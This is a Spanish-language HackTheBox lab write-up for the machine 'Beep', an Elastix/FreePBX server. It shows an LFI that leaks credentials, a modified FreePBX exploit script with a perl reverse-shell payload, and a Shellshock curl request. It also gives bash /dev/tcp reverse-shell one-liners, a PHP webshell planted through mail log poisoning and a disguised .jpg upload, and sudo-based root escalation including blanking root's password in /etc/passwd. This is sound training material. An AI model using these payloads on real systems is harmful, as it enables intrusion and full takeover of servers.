---
title: "Beep"
date: 2025-05-29 16:41:25 +0200
categories: writeups HackTheBox
tags: cve rce lfi logpoisoning infoleak shellshock webmin elastix máquina chown chmod nmap linux sudoers
description: Writeup de la máquina Beep de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228014343.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.7`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.10.7 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos un montón de puertos por lo que tendremos que enumerar muy bien el sistema.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228014444.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,25,80,110,111,143,443,793,993,995,3306,4190,4445,4559,5038,10000 -sCV 10.10.10.7 -oN targeted
```

Observamos que **Nmap** reporta un montón de información sobre los puertos abiertos pero así de primeras debemos de centrarnos en los puertos **80** y **443** ya que en ellos se aloja un servidor web, tampoco debemos de perder de vista el mítico puerto **22** pues en el se aloja un **ssh**, además en puerto **10000** nos encontramos con un webmin. Sobre los otros puertos no debemos de hacerle mucho caso de momento ya que son puertos secundarios así que los tendremos como segunda opción.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228130432.png>)

___
## Explotación

Cuando intentamos acceder página web del sitio **seguro** o a la del sitio **no seguro** veremos como nos da un error relacionado con la versión del **TLS** del certificado.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228130337.png>)

Para solucionar este error debemos de acceder a la configuración poniendo **about\:config** y luego buscaremos por **security.tls.version.min** y cambiaremos el número que nos aparezca por un **1**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228130516.png>)

> En cambio ahora si podemos acceder a la página web alojada en el puerto **443** (**sitio seguro**). Destacar que la página web del sitio **no seguro** nos redirige al sitio **seguro**.

Observamos que estamos ante un Elastix del cual desconocemos su versión.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228130621.png>)

En primer lugar realizaremos fuzzing usando **Gobuster** debemos de añadir el parámetro `-k` ya que de distinta forma no nos funcionará pues el certificado se encuentra caducado, es decir debemos de ejecutar la siguiente instrucción:

```bash
gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -x phh,html,txt,js -k
```

Lo primero que nos llama la atención es el directorio **/admin**

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228131515.png>)

Si intentamos acceder a dicho directorio a través del navegador veremos como nos salta un panel login a través de un **prompt** el cual no tendremos éxito con las típicas credenciales (**admin:admin**).

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228131554.png>)

Tras probar varias credenciales le daremos a cancelar y veremos como nos manda a **/admin/config.php** donde podremos ver un **Information Leakage** de la versión del **FreePBX** (**2.8.14**).

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228131608.png>)
### LFI

Si miramos en **searchsploit** los exploits existen para **Elastix** nos daremos cuenta que aparte varios de **Cross-Site Scripting** contamos con un **LFI**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228151853.png>)

Gracias a **searchsploit** visualizaremos dicho exploit sin descargarlo (`searchsploit -x php/webapps/37637.pl`) y observamos la ruta donde se esta produciendo el **LFI**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228152049.png>)

Accederemos a dicha ruta vía navegador web, tal y como vemos en foto, hemos podido explotar correctamente el **LFI**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228152626.png>)

En el archivo **/etc/amportal.conf** que conocemos gracias al exploit, podemos encontrar distintas credenciales gracias al **LFI**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228152852.png>)
#### Diferentes caminos:

A partir de aquí tendremos **5** diferentes formas de explotar la máquina:

1. RCE vía **Elastix** & **FreePBX** (18650.py)
2. **Webmin**
3. **SSH** como root
4. **ShellShock Attack** vía **Webmin**
5. WebShell
### 1. RCE vía Elastix & FreePBX (18650.py)

En primer lugar comenzaremos con el **RCE** que se acontece gracias a través del **FreePBX** y **Elastix** ya que al mirar el **searchsploit** encontraremos un exploit:

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228132301.png>)

Nos descargaremos dicho exploit gracias a **searchsploit** (`searchsploit -m php/webapps/18650.py`) pero antes de ejecutar el script directamente debemos de hacer unos cuantos cambios:
1. Actualizar las **Direcciones IP**
2. Actualizar para que la petición a realizar ignore el certificado caducado.
3. Encontrar la extensión

Una vez tengamos las actualizadas las **Direcciones IP** en el exploit pasaremos a añadir el código correspondiente el cual nos permitirá ignorar los certificados, es decir el código finalmente quedará así:

```python
import urllib.request
import requests
import ssl
rhost="10.10.10.7"
lhost="10.10.14.5"
lport=443
extension="1000" # El el siguiente paso conoceremos como obtener una extensión válida para esta máquina

requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'

try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    # no pyopenssl support used / needed / available
    pass

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

requests.get(url, verify=False)
```

Por último debemos de encontrar una extensión válida para ello usaremos **svwar**, en definitiva debemos de ejecutar el siguiente comando:

```bash
svwar -m INVITE -e100-300 10.10.10.7
```

Observamos que la extensión válida es **233** por lo que actualizaremos nuestro script con dicha extensión.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228133217.png>)

Una vez que ya hemos actualizado el script debemos de ponernos en escucha con **NetCat** (`nc -nlvp 443`) y seguidamente ejecutaremos el exploit con python3 (`python3 elastix_freepbx_exploit.py`).

Observamos como recibimos una **Reverse Shell** correctamente por lo que ahora debemos de proceder con la **Escalada de privilegios**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228140649.png>)
### 2. Webmin

Una vez hayamos explotado el **LFI** presente en **Elastix** tendremos las credenciales para logearnos en **Webmin**.

Accederemos al **Webmin** el cual se encuentra en el puerto **10000** y veremos que nos dice que debemos de acceder a través de un sitio seguro por lo que clicaremos en dicho enlace.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228153240.png>)

Accederemos con las credenciales encontradas anteriormente, es decir con **admin:jEhdIekWmdjE**, pero como observamos en la captura de pantalla veremos que nos da un error:

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228153503.png>)

En vez acceder con el usuario **admin**, accederemos con el usuario **root** ya que este es un usuario válido en el sistema, pues **Webmin** es una herramienta de configuración de sistema vía web. Tal y como observamos a continuación conseguiremos acceder correctamente con dichas credenciales (**root:jEhdIekWmdjE**):

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228153602.png>)

Una vez tenemos acceso al **Webmin** significará que tenemos acceso al sistema por lo que para ganar acceso a el debemos de dirigirnos a la **Command Shell** en la sección **Others**, y veremos que tenemos ejecución remota de comandos (**RCE**):

> Destacar que una vez tenemos acceso al **Webmin** existen múltiples formas de ganar acceso a la máquina pues tenemos control del sistema pero desde una página web.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228154458.png>)

En este punto lo que haremos será ponernos en escucha con **NetCat** (`nc -nlvp 443`) y en la herramienta **Commnand Shell** nos mandaremos una **Reverse Shell** usando el típico oneliner de bash (`bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"`).

Tras realizar los anteriores pasos observamos como recibimos una **Reverse Shell** como el usuario administrador por lo que no tendremos que realizar la **Escalada de privilegios**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228154551.png>)
### 3. SSH como root

Una vez hayamos explotado el **LFI** presente en **Elastix** tendremos las credenciales para logearnos en a través de **ssh**.

Observamos que al intentar logearnos nos dará un error como el que se muestra a continuación:

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228155057.png>)

Para solucionar este problema debemos de logearnos añadiendo los siguientes parámetros correspondientes a los algoritmos de cifrado, en definitiva debemos de ejecutar el siguiente comando:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -c 3des-cbc root@10.10.10.7
```

Observamos que introduciendo las credenciales encontradas anteriormente conseguimos logearnos correctamente como el usuario **root** por lo que no tendremos que **Escalar nuestros privilegios**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228155921.png>)
### 4. ShellShock Attack vía Webmin 

En cuarto lugar procedemos con un **ShellShock Attack** que se acontece en **Webmin**.

Observaremos que el login se está gestionando a través de un archivo **cgi** llamado **/session_login.cgi**:

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228161452.png>)

Para comprobar si se acontece un **ShellShock Attack** realizaremos un petición a la URL donde se encuentra el **cgi** y como cabecera pasaremos lo siguiente: `-H "User-Agent: () { :; }; ping -c 1 10.10.14.5"`.

Tal y como observamos en la imagen si nos ponemos en escucha por paquetes de la traza **ICMP** veremos como recibimos el ping correspondiente de la **Dirección IP** de la máquina víctima.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228161736.png>)

En este punto lo que haremos será mandarnos una **Reverse Shell** para ello nos pondremos en escucha con **NetCat** (`nc -nvlp 443`) y ejecutaremos la siguiente petición mediante **curl**:

```bash
curl -k -I -s -X GET  "https://10.10.10.7:10000/session_login.cgi" -H "User-Agent: () { :; }; bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"
```

Tal y como observamos a continuación veremos como recibimos una **Reverse Shell** como el usuario **root** por lo que no tendremos que **Escalar nuestros privilegios**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228162113.png>)
### 5. WebShell

Por último ejecutaremos comando desde la web, es decir una **webshell** para posteriormente ganar acceso a la máquina a través de una **Reverse Shell**.
#### Opción 1

En primer lugar como hemos conseguido explotar un **LFI** intentaremos ganar acceso a la máquina a partir de esta vulnerabilidad encontrada para ello en buscaremos por logs que tengamos capacidad de lectura. Nos daremos cuenta que podemos leer el log **/var/mail/asterisk**.

Como tenemos capacidad de lectura sobre dicho fichero intentaremos envenenar dicho log para ello debemos enviar un correo electrónico a **asterisk** y en cuerpo del mail colaremos el típico código de un **cmd.php**, esto podemos lograrlo de dos formas:
##### Telnet
Si usamos **telnet** para enviar el correo electrónico es posible que tengamos más problemas ya que es más incómodo enviar mails a través de un consola interactiva ya que no puede moverte bien.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228170237.png>)
##### swaks
Otra forma válida y mucho más cómoda de enviar un correo electrónico es con la herramienta **swaks**, en definitiva debemos de ejecutar el siguiente comando:

```bash
swaks --to asterisk@localhost --from terror@test.htb --header "Subject: test php" --body '<?php system($_GET[0]); ?>' --server 10.10.10.7
```

Nos pondremos es escucha de trazas de **ICMP** gracias a **tshark**, luego nos dirigimos a la página web donde hemos explotado el **LFI** y a la URL le concatenamos lo siguiente:

```http
&0=ping -c 1 10.10.14.5
```

Observamos que recibimos dicho paquete **ICMP** desde la **Dirección IP** de la máquina víctima por lo que habremos acontecido correctamente un **Log Poisoning** a través del correo electrónico.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228171111.png>)

En este punto lo que haremos será ponernos en **NetCat** (`nc -nvlp 443`) y nos enviaremos una **Reverse Shell** desde la **Webshell** a través del **Log Poisoning** del **mail**. 

Gracias al típico one liner de **bash** (`bash -c "bash -i >%26 /dev/tcp/10.10.14.5/443 0>%261"`) recibiremos correctamente la **shell** y ahora lo que procede es la **Escalada de privilegios**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228171215.png>)
#### Opción 2

La segunda opción con la cual podemos obtener una **webshell** a través del panel de **vtigercrm** es la que vamos a ver a continuación.

Nos logearemos en el panel de **vtigercrm** gracias a las credenciales anteriormente encontradas (**admin:jEhdIekWmdjE**):

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228174657.png>)

Observamos que hemos podido autenticarnos satisfactoriamente por lo que ahora lo que debemos de hacer es dirigirnos a **SETTINGS** y luego le daremos a **Company Detailts** tal y como podemos ver en la imagen

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228175128.png>)

Una vez estamos en la sección para editar los detalles de la empresa le daremos al botón de **Edit**:

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228174724.png>)

Ahora lo que debemos de hacer es subir un **rev.php.jpg** el cual nos enviará una **Reverse Shell**, para ello el contenido de dicho archivo debe de ser el siguiente:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"); ?>
```

Una vez hemos subido dicho archivo le daremos a **Save**:

> Destacar que nos deja subir dicho archivo porque lleva la extensión **.jpg**, es decir de lo único que se encarga de comprobar la página es que lleve la extensión **jpg**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228174816.png>)

Nos pondremos en escucha con **NetCat** (`nc -nvlp 443`) y cuando recarguemos la página donde se debería de estar viendo la imagen observaremos como recibimos la **Reverse Shell**. En este punto lo que debemos de hacer es proceder con la **Escalada de privilegios**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228174844.png>)

____
## Escalada de privilegios

Una vez hemos ganado acceso a la máquina víctima deberemos de hacer un **Tratamiento de la TTY** en caso de que no tengamos una consola totalmente interactiva. 

En primer lugar realizaremos las típicas comprobaciones para intentar elevar nuestro privilegios y nos daremos cuenta que tenemos un montón de permisos **Sudoers** que como podemos ejecutar como el usuario **root** sin proporcionar contraseña, pero los más destacables son **\*\*nmap****, ****chown**** y **chmod** tal y como podemos ver en [GTFOBins](https://gtfobins.github.io/)

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228141228.png>)
### nmap

En primer lugar conocemos como elevar nuestros privilegios gracias al permiso de **Sudoers** en **nmap**.

Nos daremos cuenta que la versión de **nmap** es bastante antigua (**4.11**) por lo que podemos elevar nuestros privilegios gracias al menú interactivo que contaba desde la versión **2.02** a la **5.21**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228141451.png>)

Su forma de explotación es muy sencilla pues debemos de añadir el parámetro `--interactive` y luego colaremos comandos gracias a la exclamación (**!**), es decir ejecutaremos lo siguiente:

```bash
sudo -u root /usr/bin/nmap --interactive
```

Luego colaremos el comando `!/bin/bash` y observamos que hemos conseguido elevar nuestros privilegios, es decir convertirnos en el usuario **root**.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228141643.png>)
### chmod

En segundo lugar veremos como elevar nuestros privilegios gracias al permiso de **Sudoers** en **chmod**.

Su forma de explotación es muy sencilla ya que debemos de aprovecharnos de dicho permiso para asignar el **SUID** a la **/bin/bash** y así ejecutarnos una **bash** privilegiada, tal y como podemos ver a continuación:

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228142907.png>)
### chown

Por último veremos como convertirnos en **root** gracias al permiso de **Sudoers** presente en el binario ****chown****, esta manera es un poco más rebuscada pero igual de válida para elevar nuestros privilegios.

En primer lugar cambiaremos el propietario y el grupo del **/etc/passwd** gracias al siguiente comando:

```bash
sudo -u root /bin/chown asterisk:asterisk /etc/passwd
```

Tal y como podemos ver en la imagen los cambios se han completado correctamente

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228143323.png>)

Lo que debemos de hacer ahora es abrir el archivo **/etc/passwd** con `nano /etc/passwd` y le quitaremos la **x** a **root**.

> En caso de no tener el nano instalado podemos usar `sed` de la siguiente forma: 
> `sed -i 's/root:x:/root::/g' /etc/passwd`

Observamos como el **root** no tiene la **x** por lo que podremos convertirnos en dicho usuario sin proporcionar contraseña.

![](<../assets/images/posts/2025-05-29-beep/Pasted image 20241228143432.png>)